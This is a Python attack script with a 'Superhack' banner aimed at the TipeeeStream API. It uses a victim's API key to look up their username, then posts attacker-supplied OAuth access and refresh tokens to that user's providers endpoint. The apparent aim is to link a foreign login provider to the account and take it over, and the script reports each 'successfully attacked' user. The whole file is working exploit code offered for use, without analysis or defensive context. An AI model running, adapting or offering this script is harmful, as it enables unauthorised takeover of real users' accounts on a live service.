# coding=utf-8
#   _________                         .__                   __    
#  /   _____/__ ________   ___________|  |__ _____    ____ |  | __
#  \_____  \|  |  \____ \_/ __ \_  __ \  |  \\__  \ _/ ___\|  |/ /
#  /        \  |  /  |_> >  ___/|  | \/   Y  \/ __ \\  \___|    < 
# /_______  /____/|   __/ \___  >__|  |___|  (____  /\___  >__|_ \
#         \/      |__|        \/           \/     \/     \/     \/

import sys
import requests

if len(sys.argv) != 5:
    print("Usage: python " + sys.argv[0] + " <apiKey> <provider> <access_token> <refresh_token>")
    exit()

apikey = sys.argv[1]
provider = sys.argv[2]
access_token = sys.argv[3]
refresh_token = sys.argv[4]

print("Getting required information..")

try:
    r = requests.get('https://api.tipeeestream.com/v1.0/me?apiKey=' + apikey)

    if "username" in r.json():
        username = r.json()["username"]

        print("Successfully got required information")
        print("Attacking " + username)

        data = {
            "access_token": access_token,
            "origin": "managementSecurity",
            "provider": provider,
            "refresh_token": refresh_token
        }

        try:
            r = requests.post('https://www.tipeeestream.com/v2.0/users/' + username + '/providers?apiKey=' + apikey, json=data)
            
            if "code" in r.json():
                if r.json()["code"] == 200:
                    print("Successfully attacked " + username)
                else:
                    print("Error by attacking " + username)
            else:
                print("Error by attacking " + username)
        except:
            print("Error by attacking " + username)
except:
    print("Error by getting required information")
